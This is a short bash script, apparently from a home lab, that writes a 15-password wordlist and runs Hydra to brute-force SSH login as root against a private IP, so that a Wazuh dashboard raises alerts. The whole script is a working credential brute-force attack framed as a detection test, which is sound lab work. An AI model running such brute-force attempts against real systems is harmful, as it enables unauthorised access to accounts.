#!/bin/bash

# =====================================================================
# Script: attack_simulation.sh
# Description: Simulates an SSH Brute-force attack using Hydra
# =====================================================================

TARGET_IP="192.168.117.131" # Change this to your Target IP
USERNAME="root"
WORDLIST="pass15.txt"

echo "[+] Creating a quick 15-line password dictionary..."
echo -e "123456\npassword\n12345678\nqwerty\n123456789\n12345\n1234\n111111\n1234567\ndragon\n123123\nbaseball\nabc123\nfootball\nmonkey" > $WORDLIST

echo "[+] Starting SSH Brute-force simulation against $TARGET_IP..."
echo "[+] Using wordlist: $WORDLIST"

# Run Hydra (-t 2 for 2 threads to prevent connection drop, -I to ignore restore file)
hydra -l $USERNAME -P $WORDLIST ssh://$TARGET_IP -t 2 -I

echo "[+] Attack simulation completed. Check Wazuh Dashboard for alerts."
